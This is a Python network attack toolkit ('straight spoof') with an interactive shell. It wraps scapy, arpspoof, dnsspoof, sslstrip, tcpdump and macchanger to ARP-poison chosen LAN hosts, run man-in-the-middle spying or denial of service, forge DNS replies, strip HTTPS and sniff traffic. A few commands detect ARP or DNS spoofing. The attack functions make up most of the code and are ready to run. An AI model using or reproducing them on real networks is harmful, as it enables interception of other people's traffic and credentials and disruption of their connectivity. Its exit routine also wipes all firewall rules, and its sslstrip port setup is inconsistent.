# straight spoof
# dependencies python3, scapy, pip3, x-term, 
# arpspoof, tcpdump, dnsspoof, dhclient, macchanger, 
# ip, arp, arping, arptables, iptables
# written by Synim Selimi

from __future__ import absolute_import, division, print_function
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import os
import sys
import time
import math
import errno
import random
import struct
import socket
import binascii
import threading
import ipaddress
import subprocess
from statistics import mode
from scapy.all import *
from cli_colors import *
from datetime import datetime
from scapy.all import *

# Software details
SSPF_VERSION = 1.0

# Globals and config
threads = []
logging.basicConfig(format='%(asctime)s %(levelname)-5s %(message)s', datefmt='%Y-%m-%d %H:%M:%S', level=logging.DEBUG)
logger = logging.getLogger(__name__)

# Helper methods
def host_ip():
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  try:
      s.connect(('111.111.111.111', 1))
      IP = s.getsockname()[0]
  except:
      IP = '127.0.0.1'
  finally:
      s.close()
  return IP

def default_gateway_ip():
  # Read the default gateway from /proc/net/route
  try:
    with open("/proc/net/route") as fh:
      for line in fh:
        fields = line.strip().split()
        if fields[1] != '00000000' or not int(fields[3], 16) & 2:
          continue
        return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
  except:
    return None
  finally:
    fh.close()

def exec_out(command_with_args = ''):
  process = os.popen(command_with_args)
  output = process.read()
  process.close()
  lines = output.strip().split('\n')
  return str(output).strip()

def exec_cmd(command_with_args = ''):
  subprocess.call(['xterm', '-e', command_with_args])

def exec_thread(command_with_args = ''):
  threadVar = threading.Thread( target = exec_cmd, args = (command_with_args,) )
  threads.append(threadVar)
  threadVar.start()
  # pid = subprocess.Popen(args=[
  #   "top"]).pid
  # return pid
  # subprocess.call('top', shell=True)
  # os.system("top")
  # call(["top"])
  # pid = subprocess.Popen([sys.executable, "top"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

def long2net(arg):
  if (arg <= 0 or arg >= 0xFFFFFFFF):
    raise ValueError("illegal netmask value", hex(arg))
  return 32 - int(round(math.log(0xFFFFFFFF - arg, 2)))


def to_CIDR_notation(bytes_network, bytes_netmask):
  network = scapy.utils.ltoa(bytes_network)
  netmask = long2net(bytes_netmask)
  net = "%s/%s" % (network, netmask)
  if netmask < 16:
    logger.warn("%s is too big. skipping" % net)
    return None

  return net

def scan_and_print_neighbors(net, interface, timeout=1):
  logger.info("arping %s on %s" % (net, interface))
  try:
    ans, unans = scapy.layers.l2.arping(net, iface=interface, timeout=timeout, verbose=True)
    for s, r in ans.res:
      line = r.sprintf("%Ether.src%  %ARP.psrc%")
      try:
        hostname = socket.gethostbyaddr(r.psrc)
        line += " " + hostname[0]
      except socket.herror:
        # failed to resolve
        pass
        logger.info(line)
  except socket.error as e:
    if e.errno == errno.EPERM:     # Operation not permitted
      logger.error("%s. Did you run as root?", e.strerror)
    else:
      raise

def default_interface(return_net = False):
  iface_routes = [route for route in scapy.config.conf.route.routes if route[3] == scapy.config.conf.iface and route[1] != 0xFFFFFFFF]
  if len(max(iface_routes, key=lambda item:item[1])) == 6:
    network, netmask, _, interface, address, _ = max(iface_routes, key=lambda item:item[1])
  elif len(max(iface_routes, key=lambda item:item[1])) == 5:
    network, netmask, _, interface, address = max(iface_routes, key=lambda item:item[1])
  net = to_CIDR_notation(network, netmask)
  if net:
    if return_net:
      return net
    else:
      return interface

def default_interface_mac():
  try:
    default_interface_mac = get_if_hwaddr(default_interface())
    if default_interface_mac == "" or not default_interface_mac:
      return None
    else:
      return default_interface_mac
  except Exception as e:
    # eprint(e)
    return None

def find_mac_for(ip):
  try:
    result = sr1(ARP(op=ARP.who_has, psrc=HOST_IP, pdst=ip), verbose = False, timeout=5)
    return result[0][ARP].hwsrc
  except:
    return False

def find_ip_for(link):
  try:
    return socket.gethostbyname(link)
  except:
    return False

def ip_to_hex(ip):
  if ip_valid(ip):
    return str(binascii.hexlify(socket.inet_aton(ip)), 'utf8')
  else:
    return False

def ip_valid(ip_addr):
  try:
    socket.inet_aton(ip_addr)
  except socket.error:
    return False
  return True

def ip_private(ip_addr):
  return ipaddress.ip_address(ip_addr).is_private

def flush_arp_ip_tables():
  os.system("arptables --flush")
  os.system("for i in $( iptables -t nat --line-numbers \
            -L | grep ^[0-9] | awk '{ print $1 }' | tac );\
            do iptables -t nat -D PREROUTING $i; done")
  os.system("iptables --flush")
  print("\n" + colors.fg.PINK + "Flushed arp, ip and nat tables." + colors.END)

def quit():
  flush_arp_ip_tables()
  print('sspf shutting down now...')
  os._exit(1)

def eprint(e):
  exc_type, exc_obj, exc_tb = sys.exc_info()
  fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
  print(exc_type, fname, exc_tb.tb_lineno)

# Functional methods
def arp(argn):
  if len(argn) == 2:
    action = argn[0]
    mode = argn[1]
    if mode == "show":
      os.system("arp -n")
    else:
      print('Command: arp show')
      print('Command: arp {interface} {target_ip} {-req | -res}')
    return
  
  action = argn[0]
  interface = argn[1]
  target_ip = argn[2]
  mode = argn[3]

  if not all(z is not None for z in argn) or \
  action not in ['arp'] or \
  interface not in ['eth0', 'wlan0'] or \
  mode not in ['-req', '-res'] or \
  not ip_valid(target_ip) or \
  not ip_private(target_ip):
    print('Command: arp {interface} {target_ip} {-req | -res}')
    return

  if mode == "-req":
    exec_thread(" ".join(map(str, ["arpspoof", "-i", interface, "-t", target_ip, ROUTER_IP])))
  elif mode == "-res":
    exec_thread(" ".join(map(str, ["arpspoof", "-i", interface, "-t", ROUTER_IP, target_ip])))
  print("Arp poisoning started.")
  print("Interface: " + interface)
  print("Target: " + target_ip)
  print("Mode: " + mode)

def dns(argn):
  action = argn[0]
  interface = argn[1]
  filepath = None
  link = None
  dns_ip = None

  if len(argn) == 3:
    filepath = argn[2]
  elif len(argn) == 4:
    link = argn[2]
    dns_ip = argn[3]
    target_ip = find_ip_for(link)
    if not ip_valid(dns_ip) or not ip_private(dns_ip) or\
    not ip_valid(target_ip):
      print('Command: dns {interface} { file | {link} {dns_ip} }')
      return

  if not all(z is not None for z in argn) or \
  action not in ['dns'] or \
  interface not in ['eth0', 'wlan0']:
    print('Command: dns {interface} { file | {link} {dns_ip} }')
    return
  
  target_ip_hex = ip_to_hex(target_ip)

  if target_ip_hex:
    print(colors.fg.RED + colors.BOLD + "Dropping DNS packets from targeted IP: " + target_ip + colors.END)
    os.system(f"iptables --append FORWARD --match string --algo kmp --hex-string '|{target_ip_hex}|' --jump DROP")

  if filepath != None:
    os.system("dnsspoof -i " + interface + " -f " + filepath)
  elif link != None and dns_ip != None:
    f = open("hosts","w+")
    f.write(dns_ip + "\t" + link)
    f.close()
    os.system("dnsspoof -i " + interface + " -f " + f.name)

def arpall(): 
  print("arpall") 
 
def sniff(argn):
  action = argn[0]
  interface = argn[1]

  if len(argn) == 3:
    filepath = argn[2]
  else:
    filepath = None

  if not all(z is not None for z in argn) or \
  action not in ['sniff'] or \
  interface not in ['eth0', 'wlan0']:
    print('Command: sniff {interface} [filepath]')
    return
  
  if(filepath):
    os.system("tcpdump -i " + interface + " -w " + filepath)
  else:
    os.system("tcpdump -i " + interface)
 
def mitm(argn):
  action = argn[0]
  interface = argn[1]
  target_ip = argn[2]
  mode = argn[3]
  ipv4_forward = exec_out("cat /proc/sys/net/ipv4/ip_forward")

  if not all(z is not None for z in argn) or \
  action not in ['mitm'] or \
  interface not in ['eth0', 'wlan0'] or \
  mode not in ['-dos', '-spy'] or \
  not ip_valid(target_ip) or \
  not ip_private(target_ip):
    print('Command: mitm {interface} {target_ip} {-dos | -spy} ')
    return

  if mode == "-dos":
    if int(ipv4_forward):
      print("To continue, stop IP forwarding: echo 0 > /proc/sys/net/ipv4/ip_forward")
      return
  elif mode == "-spy":
    if not int(ipv4_forward):
      print("To continue, allow IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward")
      return
  
  exec_thread(" ".join(map(str, ["arpspoof", "-i", interface, "-t", target_ip, ROUTER_IP])))
  exec_thread(" ".join(map(str, ["arpspoof", "-i", interface, "-t", ROUTER_IP, target_ip])))
  
  print("MITM started.")
  print("Interface: " + interface)
  print("Target: " + target_ip)
  print("Router: " + ROUTER_IP)
  print("Mode: " + mode)

 
def ssl(argn):
  action = argn[0]
  filepath = argn[1]
  port = "11111"

  if not all(z is not None for z in argn) or \
  action not in ['ssl'] or \
  not port.isdigit():
    print('Command: ssl {filepath}')
    return

  print("Have you established a MITM attack? [y/n] ", end = '')
  answer = input().strip()
  
  if answer == "y":
    print(colors.fg.YELLOW + f"Establishing iptable port forwarding [80] -> [{port}]" + colors.END)
    os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 1000")
    print(colors.fg.GREEN + "Starting ssl mitm..." + colors.END)
    os.system("sslstrip -akw " + filepath + " -l " + port)
  else:
    print("Please establish a MITM connection using 'mitm' before continuing.")


def arpp():
  current_mac = default_interface_mac()
  current_ip = host_ip()
  pck_mac = None
  pck_ip = None
  timeout_interval = 10
  pcks_proportions = 0
  attack_prob = 0
  suspicious_macs = []
  
  if not all(z is not None for z in [current_mac, current_ip]) or \
  not ip_valid(current_ip) or \
  not ip_private(current_ip):
    print('Please check your network connection.')
    return

  def arps_check(pkt):
    print("+ ", end = '', flush = True)
    nonlocal attack_prob
    if ARP in pkt and pkt[ARP].op in (1,2): #who-has or is-at
      pck_mac = pkt.sprintf("%ARP.hwsrc%")
      pck_src = pkt.sprintf("%ARP.psrc%")
      dst_mac = pkt.sprintf("%Ether.dst%")
      if ( pck_mac == current_mac and pck_src != current_ip ) or \
         ( pck_src == ROUTER_IP and dst_mac == current_mac):
        suspicious_macs.append(pck_mac)
        attack_prob += 1
        return pkt.sprintf("%ARP.hwsrc% %ARP.psrc%")
  
  print("Checking the probability of ARP spoofing attacks.", flush = True)
  packets = scapy.all.sniff(prn=arps_check, filter="arp", store=5, timeout=timeout_interval)
  
  if len(packets) != 0:
    pcks_proportions = attack_prob / len(packets)
    attack_prob = attack_prob / (timeout_interval / 2)
    attack_prob *= 90
    attack_prob += pcks_proportions * 10
    if attack_prob > 100:
      attack_prob = 100
  else:
    attack_prob = 0
    pcks_proportions = 0

  print(colors.fg.ORANGE + colors.BOLD + str(round(pcks_proportions * 100, 2)) + "%" +  colors.END + " of all ARP packets targeted this host.")
  print(colors.fg.CYAN + colors.BOLD + str(round(attack_prob, 2)) + "%" +  colors.END + " ARP poisoning probability.")

  if attack_prob > 50:
    print("Do you want to prevent it? [y/n] ", end='')
    answer = input().strip()
    if answer == 'y':
      global HOST_IP
      suspicious_mac = mode(suspicious_macs)
      print(colors.fg.PINK + colors.BOLD + "Dropping ARP packets from suspicious MAC: " + suspicious_mac + colors.END)
      os.system("arptables -A INPUT --source-mac " + suspicious_mac + " -j DROP")
      os.system("ip -s neighbour flush all")
      print(colors.fg.YELLOW + colors.BOLD + "Changing current IP: " + current_ip + colors.END)
      while current_ip == host_ip():
        os.system("dhclient -r -v")
        print(colors.fg.RED + "Acquiring a new ip address.." + colors.END)
        time.sleep(1)
        os.system("dhclient -v")
      HOST_IP = host_ip()
    else:
      pass

def dnsp(argn): 
  action = argn[0]
  link = argn[1]

  if not all(z is not None for z in argn) or \
  action not in ['dnsp']:
    print('Command: dnsp {link}')
    return
  
  ip_addr = socket.gethostbyname(link)
  if ip_valid(ip_addr):
    if ip_private(ip_addr):
      print(colors.fg.YELLOW + colors.BOLD + link + colors.END + " sends users to " + colors.UNDERLINE + ip_addr + colors.END)
      print(ip_addr + " is a private IP, hence dns spoofing" + colors.fg.RED + " MIGHT BE OCURRING" + colors.END)
      print("Please flush your dns cache and try ARP prediction/prevention command: " + colors.fg.BLUE + "arpp" + colors.END)
    else:
      print(colors.fg.YELLOW + colors.BOLD + link + colors.END + " appear to be have a public IP " + colors.UNDERLINE + ip_addr + colors.END)
      print("Dns spoofing " + colors.fg.GREEN + "LESS LIKELY" + colors.END)
  else:
    pass

def sniffp(): 
  print(colors.fg.ORANGE + colors.UNDERLINE + colors.BOLD + "To prevent sniffing from this device, arpp will be executed..." + colors.END) 
  arpp()

def lanusrs(): 
  for network, netmask, _, interface, address in scapy.config.conf.route.routes:
    # skip loopback network and default gw
    if network == 0 or interface == 'lo' or address == '127.0.0.1' or address == '0.0.0.0':
      continue

    if netmask <= 0 or netmask == 0xFFFFFFFF:
      continue

    net = to_CIDR_notation(network, netmask)

    if interface != scapy.config.conf.iface:
      # refer to http://trac.secdev.org/scapy/ticket/537
      logger.warn("skipping %s because scapy currently doesn't support arping on non-primary network interfaces", net)
      continue

    if net:
      scan_and_print_neighbors(net, interface)

def is_online(ip): 
  try: 
    # Send a ICMP request to check if ip is online 
    r = sr1(IP(dst=ip)/ICMP(), inter=0, retry=-2, timeout=1) 
    if r: 
      print(str(ip) + " is " + colors.fg.GREEN + "ONLINE" + colors.END) 
    elif r is None: 
      print(str(ip) + " is " + colors.fg.RED + "OFFLINE" + colors.END) 
  except TimeoutError as e: 
    print(str(ip) + " is OFFLINE")

def mac_changer(argn):
  action = argn[0]
  interface = argn[1]
  mode = argn[2]

  if not all(z is not None for z in argn) or \
  action not in ['mac'] or \
  interface not in ['eth0', 'wlan0']:
    print('Command: mac {interface} {show | rand | orig | {new_mac}}')
    return

  if mode == "show":
    os.system("macchanger --show " + interface)
  elif mode == "rand":
    os.system("macchanger --random --bia " + interface)
  elif mode == "orig":
    os.system("macchanger --permanent " + interface)
  else:
    new_mac = mode
    os.system("macchanger --mac=" + new_mac + " " + interface)

def find_mac(argn):
  action = argn[0]
  target_ip = argn[1]

  if not all(z is not None for z in argn) or \
  action not in ['findmac'] or \
  not ip_valid(target_ip) or \
  not ip_private(target_ip):
    print('Command: findmac {target_ip}')
    return

  print("ARP requesting MAC address for " + colors.UNDERLINE + target_ip + colors.END)
  if find_mac_for(target_ip):
    os.system("arping -c 5 " + target_ip)
  else:
    print(colors.UNDERLINE + target_ip + colors.END + " is not responding.")
    print("Check if " + colors.UNDERLINE + target_ip + colors.END + " is online using online? {target_ip}")

def netconfig():
  try:
    GATEWAY_MAC = default_interface_mac()
    print("Host IP: " + colors.fg.BLUE + HOST_IP + colors.END)
    print("Gateway IP: " + colors.fg.YELLOW + ROUTER_IP + colors.END)
    print("NIC MAC: " + colors.UNDERLINE + GATEWAY_MAC + colors.END)
    print("Gateway MAC: " + colors.UNDERLINE + find_mac_for(ROUTER_IP) + colors.END)
  except:
    print("Please check your network connection!")

def debug():
  print("Debug testing...")

def open_top():
  exec_thread("top")

# Constants
HOST_IP = host_ip() or exec_out("ip route show | awk '/default/ {print $3}'").strip()
ROUTER_IP = default_gateway_ip() or exec_out("ip route show | awk '/default/ {print $3}'").strip()

# Thread ignition
def ignition(*args):
  argl = len(args)
  cont = True

  while cont:
    try:
      if argl == 1:
        print(colors.fg.BLUE + colors.BOLD + "sspf<< " + colors.END, end = '', flush = True)
        argn = input().split(" ")
      else:
        argn = list(args[1:])
        cont = False
      
      # print("Arguments: " + str(argn))
      # assert argn[0] in ['arp', 'dns', 'arpall', 'sniff', 'mitm', 'ssl', 'arpp', 'dnsp', 'sniffp', 'lanusrs', 'online?', '--help', 'debug', '--version', 'exit'], \
      # 'Action is not one of --min, --mean, or --max: ' + argn[0]
      
      if argn[0] == "arp":
        arp(argn)
      elif argn[0] == "mitm":
        mitm(argn)
      elif argn[0] == "lanusrs":
        lanusrs()
      elif argn[0] == "sniff":
        sniff(argn)
      elif argn[0] == "dns":
        dns(argn)
      elif argn[0] == "ssl":
        ssl(argn)
      elif argn[0] == "arpp":
        arpp()
      elif argn[0] == "dnsp":
        dnsp(argn)
      elif argn[0] == "sniffp":
        sniffp()
      elif argn[0] == "online?":
        is_online(argn[1])
      elif argn[0] == "mac":
        mac_changer(argn)
      elif argn[0] == "findmac":
        find_mac(argn)
      elif argn[0] == "top":
        open_top()
      elif argn[0] == "arpall":
        arpall()
      elif argn[0] == "tableflush":
        flush_arp_ip_tables()
      elif argn[0] == "netconfig":
        netconfig()
      elif argn[0] == "debug":
        debug()
      elif argn[0] == "--help":
        print("Documentation can be found in the official repository.")
      elif argn[0] == "--version":
        print("sspf " + str(SSPF_VERSION) + "v")
      elif argn[0] == "exit":
        quit()
      elif argn[0] == "":
        print(argn[0], end = '')
      else:
        print(f"'{argn[0]}' is unknown or not available.")
    except KeyboardInterrupt:
      quit()
    except Exception as e:
      if argn[0] != None and argn[0] == "arp":
        print('Command: arp {interface} {target_ip} {-req | -res}')
      elif argn[0] != None and argn[0] == "mitm":
        print('Command: mitm {interface} {target_ip} {-dos | -spy}')
      elif argn[0] != None and argn[0] == "sniff":
        print('Command: sniff {interface} [filepath]')
      elif argn[0] != None and argn[0] == "lanusrs":
        print('Command: lanusrs')
      elif argn[0] != None and argn[0] == "online?":
        print('Command: online? {ip}')
      elif argn[0] != None and argn[0] == "dns":
        print('Command: dns {interface} {file | {link} {dns_ip}}')
      elif argn[0] != None and argn[0] == "mac":
        print('Command: mac {interface} {show | rand | orig | {new_mac}}')
      elif argn[0] != None and argn[0] == "ssl":
        print('Command: ssl {filepath}')
      elif argn[0] != None and argn[0] == "arpp":
        print('Command: arpp')
      elif argn[0] != None and argn[0] == "dnsp":
        print('Command: dnsp {link}')
      elif argn[0] != None and argn[0] == "sniffp":
        print('Command: sniffp')
      elif argn[0] != None and argn[0] == "findmac":
        print('Command: findmac {target_ip)')
      elif argn[0] != None and argn[0] == "netconfig":
        print('Command: netconfig')
      elif argn[0] != None and argn[0] == "tableflush":
        print('Command: tableflush')
      else:
        eprint(e)

# Main thread
def main():
  # print("sspf initiated")
  threadVar = threading.Thread( target = ignition, args = sys.argv )
  threads.append( threadVar )
  threadVar.start()
  
  try:
    threadVar.join()
  except KeyboardInterrupt:
    quit()

# Main thread execution
if __name__ == '__main__':
  main()